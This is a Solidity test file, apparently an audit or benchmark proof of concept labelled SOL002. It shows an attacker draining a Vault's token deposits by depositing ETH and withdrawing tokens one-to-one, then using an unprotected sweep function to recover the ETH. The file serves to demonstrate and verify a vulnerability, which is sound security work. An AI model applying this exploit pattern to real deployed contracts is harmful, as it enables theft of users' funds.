// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault, IERC20} from "../../../../src/Vault.sol";

interface Vm {
    function prank(address) external;
    function deal(address, uint256) external;
    function expectRevert() external;
    function label(address, string calldata) external;
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

contract SOL002Test {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    uint256 constant DEPOSIT = 1_000_000;

    Vault vault;
    MockERC20 token;
    address victim = address(0xA11CE);
    address attacker = address(0xBAD);

    receive() external payable {}

    function setUp() public {
        token = new MockERC20();
        vault = new Vault(IERC20(address(token)));
        vm.label(victim, "victim"); vm.label(attacker, "attacker");
        token.mint(victim, DEPOSIT);
        vm.prank(victim); token.approve(address(vault), type(uint256).max);
        vm.prank(victim); vault.deposit(DEPOSIT);
        vm.deal(attacker, DEPOSIT);
    }

    function _attack(uint256 amt) internal {
        vm.prank(attacker); vault.depositEth{value: amt}();
        vm.prank(attacker); vault.withdraw(amt);
    }

    // HARM: attacker (no token ever deposited) takes the victim's tokens for the same number of wei.
    function testExploit() public {
        uint256 atkTokBefore = token.balanceOf(attacker);
        uint256 vaultTokBefore = token.balanceOf(address(vault));
        _attack(DEPOSIT);
        require(token.balanceOf(attacker) - atkTokBefore == DEPOSIT, "attacker gained no tokens");
        require(vaultTokBefore - token.balanceOf(address(vault)) == DEPOSIT, "vault not drained");
        require(token.balanceOf(address(vault)) == 0, "vault still holds tokens");
        // victim's recorded balance is intact but unredeemable
        require(vault.balances(victim) == DEPOSIT, "victim ledger changed");
        vm.prank(victim);
        vm.expectRevert();
        vault.withdraw(DEPOSIT);
        // attacker recovers the wei too (sweep has no access control)
        uint256 ethBefore = attacker.balance;
        vm.prank(attacker); vault.sweep(payable(attacker));
        require(attacker.balance - ethBefore == DEPOSIT, "wei not recovered");
    }

    // Baseline: an attacker who deposits nothing cannot withdraw; the victim can.
    function testBaselineNoHarm() public {
        vm.prank(attacker); vm.expectRevert(); vault.withdraw(1);
        vm.prank(victim); vault.withdraw(DEPOSIT);
        require(token.balanceOf(victim) == DEPOSIT, "victim not made whole");
    }

    // Boundary: 1 wei -> 1 token unit.
    function testExploitOneWei() public {
        uint256 b = token.balanceOf(attacker);
        _attack(1);
        require(token.balanceOf(attacker) - b == 1, "no 1:1 conversion");
    }
}
